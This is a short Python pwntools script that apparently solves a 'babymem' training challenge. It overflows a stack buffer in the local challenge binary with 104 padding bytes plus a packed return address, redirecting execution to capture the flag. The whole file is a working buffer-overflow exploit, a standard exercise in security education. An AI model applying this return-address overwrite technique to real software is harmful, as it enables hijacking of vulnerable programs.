import pwn

p = pwn.process("/challenge/babymem-level-3-0")

p.readuntil(b"size: ")
p.writeline("112")

p.readuntil(b"bytes)!")
val = pwn.p64(0x0000000000401f25)
p.write(b"A"*104+val)

print(p.readall().decode("utf-8"))
